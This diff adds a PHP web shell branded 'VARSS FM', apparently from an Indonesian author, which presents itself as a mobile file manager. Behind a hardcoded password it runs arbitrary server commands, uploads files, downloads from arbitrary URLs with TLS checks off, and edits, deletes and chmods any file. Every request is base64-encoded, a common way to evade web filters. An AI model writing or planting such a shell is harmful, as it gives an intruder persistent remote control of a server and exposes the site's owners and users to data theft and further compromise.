@@ -1,0 +1,568 @@
+<?php
+session_start();
+
+// Konfigurasi password
+$correct_password = 'danang123';
+
+// Cek login
+if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
+        if ($_POST['password'] === $correct_password) {
+            $_SESSION['logged_in'] = true;
+            header('Location: ' . $_SERVER['PHP_SELF']);
+            exit;
+        } else {
+            $error = 'Password salah!';
+        }
+    }
+    ?>
+    <!DOCTYPE html>
+    <html lang="id">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+        <title>VARSS FM - Login</title>
+        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+        <style>
+            * { margin:0; padding:0; box-sizing:border-box; }
+            body { font-family: 'Inter', sans-serif; background: radial-gradient(circle at 20% 30%, #0f0f1a, #030308); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 1rem; }
+            .login-card { background: rgba(15,25,35,0.85); backdrop-filter: blur(12px); border-radius: 2rem; padding: 2rem 1.5rem; width: 100%; max-width: 360px; border: 1px solid rgba(139,92,246,0.4); text-align: center; }
+            .logo { font-size: 2.5rem; font-weight: 800; background: linear-gradient(135deg, #c084fc, #8b5cf6); -webkit-background-clip: text; background-clip: text; color: transparent; }
+            .sub { color: #a78bfa; margin-bottom: 1.5rem; font-size: 0.9rem; }
+            input { width: 100%; background: rgba(0,0,0,0.5); border: 1px solid #4c1d95; padding: 0.8rem 1rem; border-radius: 2rem; color: white; margin: 1rem 0; font-size: 1rem; }
+            button { background: linear-gradient(95deg, #7c3aed, #a855f7); border: none; width: 100%; padding: 0.8rem; border-radius: 2rem; font-weight: bold; color: white; cursor: pointer; font-size: 1rem; }
+            .error { color: #f87171; margin-top: 1rem; font-size: 0.9rem; }
+        </style>
+    </head>
+    <body>
+        <div class="login-card">
+            <div class="logo">VARSS FM</div>
+            <div class="sub">FILE MANAGER + CMD</div>
+            <?php if (isset($error)) echo "<div class='error'><i class='fas fa-exclamation-triangle'></i> $error</div>"; ?>
+            <form method="POST">
+                <input type="password" name="password" placeholder="Password" autofocus>
+                <button type="submit"><i class="fas fa-sign-in-alt"></i> MASUK</button>
+            </form>
+        </div>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+// ==================== PENGE CEKAN FUNGSI EKSEKUSI ====================
+$disabled_functions = array_map('trim', explode(',', ini_get('disable_functions')));
+$exec_enabled = !in_array('exec', $disabled_functions);
+$shell_exec_enabled = !in_array('shell_exec', $disabled_functions);
+if (!$exec_enabled && !$shell_exec_enabled) {
+    $cmd_warning = "⚠️ Server tidak mengizinkan eksekusi perintah (exec & shell_exec disabled). Command akan gagal.";
+} else {
+    $cmd_warning = "";
+}
+
+// ==================== FUNGSI UTAMA ====================
+function formatSize($bytes) {
+    if ($bytes === false) return '-';
+    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
+    $bytes = max($bytes, 0);
+    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
+    $pow = min($pow, count($units) - 1);
+    $bytes /= pow(1024, $pow);
+    return round($bytes, 2) . ' ' . $units[$pow];
+}
+
+function getPerms($file) {
+    clearstatcache();
+    return substr(sprintf('%o', fileperms($file)), -4);
+}
+
+function getPermsColor($file) {
+    return is_writable($file) ? '#10b981' : '#ef4444';
+}
+
+$clean_url = strtok($_SERVER["REQUEST_URI"], '?');
+$base_dir = str_replace('\\', '/', dirname(__FILE__));
+
+// Navigasi direktori
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sys_action'])) {
+    $sys_action = $_POST['sys_action'];
+    if ($sys_action === 'cd_b64' && isset($_POST['payload_b64'])) {
+        $req_dir = base64_decode($_POST['payload_b64']);
+        if ($req_dir !== false) {
+            $real = realpath($req_dir);
+            if ($real && is_dir($real)) {
+                $_SESSION['current_dir'] = str_replace('\\', '/', $real);
+            }
+        }
+        header("Location: " . $clean_url);
+        exit;
+    }
+    if ($sys_action === 'open_edit_b64' && isset($_POST['payload_b64'])) {
+        $_SESSION['edit_file'] = base64_decode($_POST['payload_b64']);
+        header("Location: " . $clean_url);
+        exit;
+    }
+    if ($sys_action === 'close_edit') {
+        unset($_SESSION['edit_file']);
+        header("Location: " . $clean_url);
+        exit;
+    }
+}
+
+$current_dir = $_SESSION['current_dir'] ?? $base_dir;
+if (!is_dir($current_dir)) {
+    $current_dir = $base_dir;
+    $_SESSION['current_dir'] = $current_dir;
+}
+
+// Handle operasi file & command
+$message = '';
+$message_type = 'success';
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
+    $action = $_POST['action'];
+
+    // Upload
+    if ($action === 'upload_b64' && isset($_POST['filename_b64'], $_POST['file_data_b64'])) {
+        $filename = base64_decode($_POST['filename_b64']);
+        $upload_path = $current_dir . '/' . basename($filename);
+        $file_data = base64_decode($_POST['file_data_b64']);
+        if ($file_data !== false && file_put_contents($upload_path, $file_data) !== false) {
+            $message = "Upload OK";
+        } else {
+            $message = "Upload gagal";
+            $message_type = "error";
+        }
+    }
+
+    // Fetch URL
+    if ($action === 'curl_download_b64' && isset($_POST['url_b64'])) {
+        $url = base64_decode($_POST['url_b64']);
+        $save_as_b64 = $_POST['save_as_b64'] ?? '';
+        $save_as = !empty($save_as_b64) ? base64_decode($save_as_b64) : basename(parse_url($url, PHP_URL_PATH));
+        if (empty($save_as)) $save_as = "downloaded_" . time() . ".txt";
+        $target = $current_dir . '/' . $save_as;
+        $ch = curl_init($url);
+        $fp = @fopen($target, 'wb');
+        if ($fp) {
+            curl_setopt_array($ch, [
+                CURLOPT_FILE => $fp,
+                CURLOPT_HEADER => 0,
+                CURLOPT_FOLLOWLOCATION => true,
+                CURLOPT_SSL_VERIFYPEER => false,
+                CURLOPT_SSL_VERIFYHOST => false,
+                CURLOPT_USERAGENT => 'Mozilla/5.0'
+            ]);
+            curl_exec($ch);
+            $error = curl_error($ch);
+            curl_close($ch);
+            fclose($fp);
+            if (empty($error)) {
+                $message = "Download OK";
+            } else {
+                $message = "Gagal: " . $error;
+                $message_type = "error";
+                @unlink($target);
+            }
+        } else {
+            $message = "Gagal buat file";
+            $message_type = "error";
+        }
+    }
+
+    // New folder
+    if ($action === 'new_folder' && !empty($_POST['folder_name_b64'])) {
+        $folder_name = base64_decode($_POST['folder_name_b64']);
+        $new_folder = $current_dir . '/' . basename($folder_name);
+        if (!file_exists($new_folder) && mkdir($new_folder, 0755)) {
+            $message = "Folder '$folder_name' berhasil dibuat";
+        } else {
+            $message = "Gagal membuat folder (mungkin sudah ada atau izin ditolak)";
+            $message_type = "error";
+        }
+    }
+
+    // ========== PERBAIKAN UTAMA: New file dengan pesan jelas ==========
+    if ($action === 'new_file' && !empty($_POST['file_name_b64'])) {
+        $file_name = base64_decode($_POST['file_name_b64']);
+        // Bersihkan nama file (hindari path traversal)
+        $file_name = basename($file_name);
+        $new_file = $current_dir . '/' . $file_name;
+        
+        if (empty($file_name)) {
+            $message = "Nama file tidak boleh kosong";
+            $message_type = "error";
+        } elseif (!is_writable($current_dir)) {
+            $message = "Folder tidak memiliki izin tulis, tidak bisa membuat file";
+            $message_type = "error";
+        } elseif (file_exists($new_file)) {
+            $message = "File '$file_name' sudah ada";
+            $message_type = "error";
+        } else {
+            $created = @file_put_contents($new_file, '');
+            if ($created !== false) {
+                $message = "✅ File '$file_name' berhasil dibuat";
+                $message_type = "success";
+            } else {
+                $message = "❌ Gagal membuat file (periksa batasan hosting atau izin folder)";
+                $message_type = "error";
+            }
+        }
+    }
+
+    // Delete
+    if ($action === 'delete_b64' && isset($_POST['target_b64'])) {
+        $target = $current_dir . '/' . base64_decode($_POST['target_b64']);
+        if (is_dir($target)) {
+            $res = @rmdir($target);
+            $message = $res ? "Folder dihapus" : "Hapus folder gagal (tidak kosong)";
+            $message_type = $res ? "success" : "error";
+        } else {
+            $res = @unlink($target);
+            $message = $res ? "File dihapus" : "Hapus file gagal";
+            $message_type = $res ? "success" : "error";
+        }
+    }
+
+    // Rename
+    if ($action === 'rename_b64' && isset($_POST['old_name_b64'], $_POST['new_name_b64'])) {
+        $old = base64_decode($_POST['old_name_b64']);
+        $new = base64_decode($_POST['new_name_b64']);
+        $old_path = $current_dir . '/' . $old;
+        $new_path = $current_dir . '/' . $new;
+        if (rename($old_path, $new_path)) {
+            $message = "Nama diubah menjadi '$new'";
+        } else {
+            $message = "Gagal mengubah nama";
+            $message_type = "error";
+        }
+    }
+
+    // Chmod
+    if ($action === 'chmod_b64' && isset($_POST['target_b64'], $_POST['perms'])) {
+        $target = $current_dir . '/' . base64_decode($_POST['target_b64']);
+        $perms = octdec($_POST['perms']);
+        if (@chmod($target, $perms)) {
+            $message = "Permission diubah ke " . $_POST['perms'];
+        } else {
+            $message = "Gagal mengubah permission";
+            $message_type = "error";
+        }
+    }
+
+    // Save edit
+    if ($action === 'save_edit' && isset($_POST['target_file_b64'])) {
+        $target_file = $current_dir . '/' . base64_decode($_POST['target_file_b64']);
+        $content_b64 = $_POST['file_content_b64'] ?? '';
+        $content = base64_decode($content_b64);
+        if ($content !== false && file_put_contents($target_file, $content) !== false) {
+            $message = "File berhasil disimpan";
+            unset($_SESSION['edit_file']);
+        } else {
+            $message = "Gagal menyimpan file";
+            $message_type = "error";
+        }
+    }
+
+    // Run command
+    if ($action === 'run_command' && isset($_POST['cmd_b64'])) {
+        $cmd = base64_decode($_POST['cmd_b64']);
+        
+        if (!$exec_enabled && !$shell_exec_enabled) {
+            $result = "❌ Eksekusi perintah dilarang oleh server (exec & shell_exec disabled).";
+            $return_var = 1;
+        } else {
+            if (preg_match('/^\s*wget\s+/i', $cmd)) {
+                $check_wget = @shell_exec('which wget 2>/dev/null');
+                if (empty(trim($check_wget))) {
+                    $url_part = preg_replace('/^\s*wget\s+/i', '', $cmd);
+                    $cmd = 'curl -O ' . $url_part;
+                    $_SESSION['cmd_note'] = "⚠️ wget tidak tersedia, menggunakan curl sebagai pengganti.";
+                }
+            }
+            
+            $descriptorspec = [
+                1 => ['pipe', 'w'],
+                2 => ['pipe', 'w']
+            ];
+            $process = @proc_open($cmd, $descriptorspec, $pipes);
+            if (is_resource($process)) {
+                $stdout = stream_get_contents($pipes[1]);
+                $stderr = stream_get_contents($pipes[2]);
+                fclose($pipes[1]);
+                fclose($pipes[2]);
+                $return_var = proc_close($process);
+                $result = trim($stdout . "\n" . $stderr);
+            } else {
+                $output = [];
+                exec($cmd . ' 2>&1', $output, $return_var);
+                $result = implode("\n", $output);
+            }
+            
+            if ($return_var !== 0 && empty($result)) {
+                $result = "Error: perintah gagal dijalankan.\nPerintah: $cmd\n\nCek: \n- Apakah fungsi exec() diaktifkan?\n- Apakah command tersedia di sistem?";
+            }
+        }
+        
+        $_SESSION['cmd_output'] = $result;
+        $_SESSION['cmd_input'] = $cmd;
+        if (isset($_SESSION['cmd_note'])) {
+            $_SESSION['cmd_output'] .= "\n\n[Info] " . $_SESSION['cmd_note'];
+            unset($_SESSION['cmd_note']);
+        }
+        
+        header("Location: " . $clean_url);
+        exit;
+    }
+    
+    if (!empty($message)) {
+        $_SESSION['msg'] = $message;
+        $_SESSION['msg_type'] = $message_type;
+        header("Location: " . $clean_url);
+        exit;
+    }
+}
+
+// Ambil pesan session
+if (isset($_SESSION['msg'])) {
+    $message = $_SESSION['msg'];
+    $message_type = $_SESSION['msg_type'];
+    unset($_SESSION['msg'], $_SESSION['msg_type']);
+}
+
+$cmd_output = $_SESSION['cmd_output'] ?? null;
+$cmd_input = $_SESSION['cmd_input'] ?? '';
+unset($_SESSION['cmd_output'], $_SESSION['cmd_input']);
+
+// Baca direktori
+$items = @scandir($current_dir);
+if ($items === false) {
+    $items = [];
+    $message = "Akses direktori ditolak";
+    $message_type = "error";
+}
+$directories = [];
+$files = [];
+foreach ($items as $item) {
+    if ($item === '.') continue;
+    if (is_dir($current_dir . '/' . $item)) {
+        $directories[] = $item;
+    } else {
+        $files[] = $item;
+    }
+}
+sort($directories);
+sort($files);
+
+// Edit mode
+$edit_mode = false;
+$edit_content_b64 = '';
+$edit_filename = '';
+if (isset($_SESSION['edit_file'])) {
+    $edit_filename = $_SESSION['edit_file'];
+    $edit_path = $current_dir . '/' . $edit_filename;
+    if (is_file($edit_path) && is_readable($edit_path)) {
+        $edit_mode = true;
+        $content = file_get_contents($edit_path);
+        $edit_content_b64 = ($content !== false) ? base64_encode($content) : '';
+    } else {
+        unset($_SESSION['edit_file']);
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>VARSS FM - Mobile</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', sans-serif; background: radial-gradient(circle at 20% 30%, #0f0f1a, #030308); color: #eef2ff; padding: 12px; padding-bottom: 80px; }
+        .container { max-width: 700px; margin: 0 auto; }
+        .header { backdrop-filter: blur(12px); background: rgba(15, 25, 35, 0.7); border-radius: 1.5rem; padding: 0.8rem 1rem; margin-bottom: 1rem; border: 1px solid rgba(139, 92, 246, 0.3); display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px; }
+        h1 { font-size: 1.3rem; font-weight: 700; background: linear-gradient(135deg, #c084fc, #8b5cf6); -webkit-background-clip: text; background-clip: text; color: transparent; display: inline-flex; align-items: center; gap: 6px; }
+        .user-info { font-size: 0.7rem; color: #c084fc; display: flex; gap: 12px; align-items: center; }
+        .user-info a { color: #f87171; text-decoration: none; }
+        .message { padding: 0.7rem; border-radius: 1rem; margin-bottom: 1rem; font-size: 0.85rem; text-align: center; }
+        .success { background: rgba(16,185,129,0.2); border-left: 3px solid #10b981; }
+        .error { background: rgba(239,68,68,0.2); border-left: 3px solid #ef4444; }
+        .cmd-output { background: rgba(0,0,0,0.5); border-radius: 1rem; padding: 0.8rem; margin-bottom: 1rem; border-left: 3px solid #8b5cf6; font-family: monospace; font-size: 0.75rem; white-space: pre-wrap; word-break: break-all; position: relative; }
+        .copy-btn { position: absolute; top: 8px; right: 8px; background: #4c1d95; border: none; color: white; padding: 4px 8px; border-radius: 12px; font-size: 0.7rem; cursor: pointer; }
+        .path-bar { background: rgba(0,0,0,0.4); backdrop-filter: blur(8px); border-radius: 1.2rem; padding: 0.6rem 1rem; margin-bottom: 1rem; display: flex; justify-content: space-between; align-items: center; gap: 8px; flex-wrap: wrap; }
+        .path-text { font-family: monospace; font-size: 0.7rem; background: #0a0a12; padding: 0.3rem 0.8rem; border-radius: 2rem; word-break: break-all; flex: 1; }
+        .btn-icon { background: rgba(139,92,246,0.2); border: none; padding: 0.4rem 0.8rem; border-radius: 2rem; color: white; cursor: pointer; font-size: 0.8rem; }
+        .action-grid { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; margin-bottom: 1.5rem; background: rgba(0,0,0,0.2); padding: 12px; border-radius: 3rem; }
+        .action-btn { background: linear-gradient(135deg, #7c3aed, #a855f7); border: none; width: 52px; height: 52px; border-radius: 50%; color: white; font-size: 1.5rem; cursor: pointer; transition: transform 0.1s ease, box-shadow 0.1s ease; display: inline-flex; align-items: center; justify-content: center; box-shadow: 0 4px 10px rgba(124, 58, 237, 0.3); }
+        .action-btn:active { transform: scale(0.92); box-shadow: 0 2px 5px rgba(124, 58, 237, 0.5); }
+        .file-list { display: flex; flex-direction: column; gap: 8px; }
+        .file-item { background: rgba(10,15,25,0.6); backdrop-filter: blur(4px); border-radius: 1rem; padding: 10px 12px; display: flex; align-items: center; justify-content: space-between; flex-wrap: nowrap; gap: 8px; border: 1px solid rgba(139,92,246,0.2); }
+        .file-left { display: flex; align-items: center; gap: 10px; flex: 3; min-width: 0; }
+        .file-left i { font-size: 1.2rem; width: 24px; color: #c084fc; flex-shrink: 0; }
+        .file-info { overflow: hidden; }
+        .file-name { font-weight: 500; font-size: 0.85rem; word-break: break-word; }
+        .file-name a { color: #90d4ff; text-decoration: none; }
+        .file-meta { font-size: 0.65rem; color: #9ca3af; display: flex; gap: 8px; margin-top: 2px; }
+        .file-actions { display: flex; gap: 6px; flex-shrink: 0; }
+        .icon-btn-sm { background: none; border: none; color: #cbd5e1; font-size: 1rem; padding: 6px; border-radius: 50%; cursor: pointer; width: 32px; height: 32px; display: inline-flex; align-items: center; justify-content: center; }
+        .icon-btn-sm:active { background: rgba(139,92,246,0.3); }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); backdrop-filter: blur(8px); justify-content: center; align-items: center; z-index: 1000; padding: 16px; }
+        .modal-card { background: #1e293b; border-radius: 1.5rem; padding: 1.5rem; width: 100%; max-width: 400px; border: 1px solid #8b5cf6; }
+        .modal-card h3 { margin-bottom: 1rem; font-size: 1.2rem; }
+        .modal-card input, .modal-card textarea { width: 100%; margin: 0.5rem 0 1rem; padding: 0.7rem; border-radius: 0.8rem; background: #0f172a; border: 1px solid #4c1d95; color: white; font-size: 0.9rem; }
+        .modal-actions { display: flex; justify-content: flex-end; gap: 10px; margin-top: 1rem; }
+        .modal-actions button { padding: 0.5rem 1rem; border-radius: 2rem; border: none; background: #4c1d95; color: white; cursor: pointer; }
+        .editor-panel { margin-top: 1rem; background: #0f172ad9; border-radius: 1.5rem; padding: 1rem; }
+        textarea { width: 100%; background: #0a0f1c; border: 1px solid #4c1d95; color: #e2e8f0; font-family: monospace; font-size: 0.8rem; padding: 0.8rem; border-radius: 1rem; }
+        @media (max-width: 480px) { .action-btn { width: 48px; height: 48px; font-size: 1.3rem; } .file-item { flex-wrap: wrap; } .file-left { flex: 1; } .file-actions { margin-left: auto; } }
+        .warning-banner { background: rgba(245,158,11,0.2); border-left: 3px solid #f59e0b; padding: 6px 10px; border-radius: 12px; margin-bottom: 12px; font-size: 0.75rem; color: #fcd34d; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <h1><i class="fas fa-terminal"></i> VARSS FM</h1>
+        <div class="user-info">
+            <i class="fas fa-user-check"></i> Admin | <a href="?logout=1"><i class="fas fa-sign-out-alt"></i> Keluar</a>
+        </div>
+    </div>
+    <?php if (isset($_GET['logout'])): session_destroy(); header('Location: '.$_SERVER['PHP_SELF']); exit; endif; ?>
+    
+    <?php if ($cmd_warning): ?>
+        <div class="warning-banner"><i class="fas fa-exclamation-triangle"></i> <?= htmlspecialchars($cmd_warning) ?></div>
+    <?php endif; ?>
+    
+    <?php if ($message): ?>
+        <div class="message <?= $message_type === 'error' ? 'error' : 'success' ?>">
+            <i class="fas <?= $message_type === 'error' ? 'fa-circle-exclamation' : 'fa-circle-check' ?>"></i> <?= htmlspecialchars($message) ?>
+        </div>
+    <?php endif; ?>
+    
+    <?php if ($cmd_output !== null): ?>
+        <div class="cmd-output" id="cmdOutputBox">
+            <strong><i class="fas fa-dollar-sign"></i> <?= htmlspecialchars($cmd_input) ?></strong>
+            <button class="copy-btn" onclick="copyCommandOutput()"><i class="fas fa-copy"></i> Copy</button>
+            <pre style="margin-top:8px; font-family:monospace; font-size:0.7rem; overflow-x:auto;" id="cmdOutputText"><?= htmlspecialchars($cmd_output) ?></pre>
+        </div>
+    <?php endif; ?>
+    
+    <div class="path-bar">
+        <span class="path-text"><i class="fas fa-folder-open"></i> <?= htmlspecialchars($current_dir) ?></span>
+        <button class="btn-icon" onclick="cd('<?= base64_encode($base_dir) ?>')"><i class="fas fa-home"></i> Home</button>
+    </div>
+    
+    <div class="action-grid">
+        <button class="action-btn" onclick="showModal('uploadModal')" title="Upload"><i class="fas fa-upload"></i></button>
+        <button class="action-btn" onclick="showModal('curlModal')" title="Fetch URL"><i class="fas fa-cloud-download-alt"></i></button>
+        <button class="action-btn" onclick="showModal('newFolderModal')" title="Folder Baru"><i class="fas fa-folder-plus"></i></button>
+        <button class="action-btn" onclick="showModal('newFileModal')" title="File Baru"><i class="fas fa-file-plus"></i></button>
+        <button class="action-btn" onclick="showModal('cmdModal')" title="Command"><i class="fas fa-terminal"></i></button>
+        <?php if ($edit_mode): ?>
+            <button class="action-btn" onclick="closeEditor()" title="Tutup Editor"><i class="fas fa-times-circle"></i></button>
+        <?php endif; ?>
+    </div>
+    
+    <?php if ($edit_mode): ?>
+        <div class="editor-panel">
+            <div style="display:flex; justify-content:space-between; margin-bottom:8px;">
+                <span><i class="fas fa-code"></i> Edit: <strong><?= htmlspecialchars($edit_filename) ?></strong></span>
+            </div>
+            <form method="post">
+                <input type="hidden" name="action" value="save_edit">
+                <input type="hidden" name="target_file_b64" value="<?= base64_encode($edit_filename) ?>">
+                <textarea name="file_content_b64" rows="12"><?= htmlspecialchars($edit_content_b64) ?></textarea>
+                <div style="display:flex; gap:8px; margin-top:8px;">
+                    <button type="submit" class="btn-icon" style="background:#10b981;"><i class="fas fa-save"></i> Simpan</button>
+                    <button type="button" class="btn-icon" onclick="closeEditor()">Batal</button>
+                </div>
+            </form>
+        </div>
+    <?php endif; ?>
+    
+    <!-- Daftar file & folder -->
+    <div class="file-list">
+        <?php if ($current_dir !== $base_dir): ?>
+            <div class="file-item">
+                <div class="file-left">
+                    <i class="fas fa-arrow-up"></i>
+                    <div class="file-info">
+                        <div class="file-name"><a href="#" onclick="cd('<?= base64_encode(dirname($current_dir)) ?>')">.. (Parent)</a></div>
+                        <div class="file-meta">-</div>
+                    </div>
+                </div>
+                <div class="file-actions"></div>
+            </div>
+        <?php endif; ?>
+        <?php foreach ($directories as $dir): ?>
+            <div class="file-item">
+                <div class="file-left">
+                    <i class="fas fa-folder"></i>
+                    <div class="file-info">
+                        <div class="file-name"><a href="#" onclick="cd('<?= base64_encode($current_dir.'/'.$dir) ?>')"><?= htmlspecialchars($dir) ?></a></div>
+                        <div class="file-meta"><span class="badge-perm" style="color:<?= getPermsColor($current_dir.'/'.$dir) ?>"><?= getPerms($current_dir.'/'.$dir) ?></span></div>
+                    </div>
+                </div>
+                <div class="file-actions">
+                    <button class="icon-btn-sm" onclick="renameItem('<?= base64_encode($dir) ?>')" title="Rename"><i class="fas fa-pen"></i></button>
+                    <button class="icon-btn-sm" onclick="deleteItem('<?= base64_encode($dir) ?>')" title="Delete"><i class="fas fa-trash-alt"></i></button>
+                    <button class="icon-btn-sm" onclick="chmodItem('<?= base64_encode($dir) ?>')" title="Chmod"><i class="fas fa-key"></i></button>
+                </div>
+            </div>
+        <?php endforeach; ?>
+        <?php foreach ($files as $file): 
+            $full = $current_dir.'/'.$file;
+            $size = filesize($full);
+        ?>
+            <div class="file-item">
+                <div class="file-left">
+                    <i class="fas fa-file-alt"></i>
+                    <div class="file-info">
+                        <div class="file-name"><?= htmlspecialchars($file) ?></div>
+                        <div class="file-meta"><?= formatSize($size) ?> | <span style="color:<?= getPermsColor($full) ?>"><?= getPerms($full) ?></span></div>
+                    </div>
+                </div>
+                <div class="file-actions">
+                    <button class="icon-btn-sm" onclick="editFile('<?= base64_encode($file) ?>')" title="Edit"><i class="fas fa-edit"></i></button>
+                    <button class="icon-btn-sm" onclick="renameItem('<?= base64_encode($file) ?>')" title="Rename"><i class="fas fa-pen"></i></button>
+                    <button class="icon-btn-sm" onclick="deleteItem('<?= base64_encode($file) ?>')" title="Delete"><i class="fas fa-trash-alt"></i></button>
+                    <button class="icon-btn-sm" onclick="chmodItem('<?= base64_encode($file) ?>')" title="Chmod"><i class="fas fa-key"></i></button>
+                </div>
+            </div>
+        <?php endforeach; ?>
+    </div>
+</div>
+
+<!-- Modal Upload -->
+<div id="uploadModal" class="modal"><div class="modal-card"><h3><i class="fas fa-upload"></i> Upload</h3><input type="file" id="uploadFile"><div class="modal-actions"><button onclick="uploadFile()">Upload</button><button onclick="hideModal('uploadModal')">Batal</button></div></div></div>
+<!-- Modal Fetch URL -->
+<div id="curlModal" class="modal"><div class="modal-card"><h3><i class="fas fa-cloud-download-alt"></i> Download URL</h3><input type="text" id="fetchUrl" placeholder="https://..."><input type="text" id="saveAs" placeholder="Nama simpan (opsional)"><div class="modal-actions"><button onclick="fetchUrl()">Download</button><button onclick="hideModal('curlModal')">Batal</button></div></div></div>
+<!-- Modal New Folder -->
+<div id="newFolderModal" class="modal"><div class="modal-card"><h3><i class="fas fa-folder-plus"></i> Folder Baru</h3><input type="text" id="folderName" placeholder="nama_folder"><div class="modal-actions"><button onclick="createFolder()">Buat</button><button onclick="hideModal('newFolderModal')">Batal</button></div></div></div>
+<!-- Modal New File -->
+<div id="newFileModal" class="modal"><div class="modal-card"><h3><i class="fas fa-file-plus"></i> File Baru</h3><input type="text" id="fileName" placeholder="file.txt"><div class="modal-actions"><button onclick="createFile()">Buat</button><button onclick="hideModal('newFileModal')">Batal</button></div></div></div>
+<!-- Modal Command -->
+<div id="cmdModal" class="modal"><div class="modal-card"><h3><i class="fas fa-terminal"></i> Jalankan Perintah</h3><input type="text" id="commandInput" placeholder="ls -la" style="font-family:monospace;"><div class="modal-actions"><button onclick="runCommand()">Execute</button><button onclick="hideModal('cmdModal')">Batal</button></div></div></div>
+
+<script>
+function showModal(id){document.getElementById(id).style.display='flex';}
+function hideModal(id){document.getElementById(id).style.display='none';}
+function cd(b64path){var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="sys_action" value="cd_b64"><input name="payload_b64" value="'+b64path+'">';document.body.appendChild(f);f.submit();}
+function editFile(b64file){var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="sys_action" value="open_edit_b64"><input name="payload_b64" value="'+b64file+'">';document.body.appendChild(f);f.submit();}
+function deleteItem(b64target){if(confirm('Hapus permanen?')){var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="action" value="delete_b64"><input name="target_b64" value="'+b64target+'">';document.body.appendChild(f);f.submit();}}
+function renameItem(b64old){var newname=prompt('Nama baru:');if(newname){var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="action" value="rename_b64"><input name="old_name_b64" value="'+b64old+'"><input name="new_name_b64" value="'+btoa(newname)+'">';document.body.appendChild(f);f.submit();}}
+function chmodItem(b64target){var perms=prompt('Permission (contoh: 0755):','0755');if(perms){var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="action" value="chmod_b64"><input name="target_b64" value="'+b64target+'"><input name="perms" value="'+perms+'">';document.body.appendChild(f);f.submit();}}
+function uploadFile(){var file=document.getElementById('uploadFile').files[0];if(!file){alert('Pilih file');return;}var r=new FileReader();r.onload=function(e){var b64=btoa(e.target.result);var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="action" value="upload_b64"><input name="filename_b64" value="'+btoa(file.name)+'"><input name="file_data_b64" value="'+b64+'">';document.body.appendChild(f);f.submit();};r.readAsBinaryString(file);}
+function fetchUrl(){var url=document.getElementById('fetchUrl').value;if(!url){alert('Masukkan URL');return;}var saveAs=document.getElementById('saveAs').value;var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="action" value="curl_download_b64"><input name="url_b64" value="'+btoa(url)+'"><input name="save_as_b64" value="'+btoa(saveAs)+'">';document.body.appendChild(f);f.submit();}
+function createFolder(){var name=document.getElementById('folderName').value;if(!name){alert('Masukkan nama folder');return;}var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="action" value="new_folder"><input name="folder_name_b64" value="'+btoa(name)+'">';document.body.appendChild(f);f.submit();}
+function createFile(){var name=document.getElementById('fileName').value;if(!name.trim()){alert('Masukkan nama file');return;} var utf8Name = unescape(encodeURIComponent(name)); var b64Name = btoa(utf8Name); var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="action" value="new_file"><input name="file_name_b64" value="'+b64Name+'">';document.body.appendChild(f);f.submit();}
+function closeEditor(){var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="sys_action" value="close_edit">';document.body.appendChild(f);f.submit();}
+function runCommand(){var cmd=document.getElementById('commandInput').value;if(!cmd.trim()){alert('Masukkan perintah');return;}var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="action" value="run_command"><input name="cmd_b64" value="'+btoa(cmd)+'">';document.body.appendChild(f);f.submit();}
+function copyCommandOutput() { var pre = document.getElementById('cmdOutputText'); var text = pre.innerText; if (navigator.clipboard && navigator.clipboard.writeText) { navigator.clipboard.writeText(text).then(function() { showCopyFeedback(true); }).catch(function() { fallbackCopy(text); }); } else { fallbackCopy(text); } }
+function fallbackCopy(text) { var textarea = document.createElement('textarea'); textarea.value = text; document.body.appendChild(textarea); textarea.select(); document.execCommand('copy'); document.body.removeChild(textarea); showCopyFeedback(true); }
+function showCopyFeedback(success) { var btn = document.querySelector('.copy-btn'); if (success) { btn.innerHTML = '<i class="fas fa-check"></i> Copied!'; setTimeout(function() { btn.innerHTML = '<i class="fas fa-copy"></i> Copy'; }, 1500); } else { btn.innerHTML = '<i class="fas fa-times"></i> Gagal'; setTimeout(function() { btn.innerHTML = '<i class="fas fa-copy"></i> Copy'; }, 1500); } }
+</script>
+</body>
+</html>
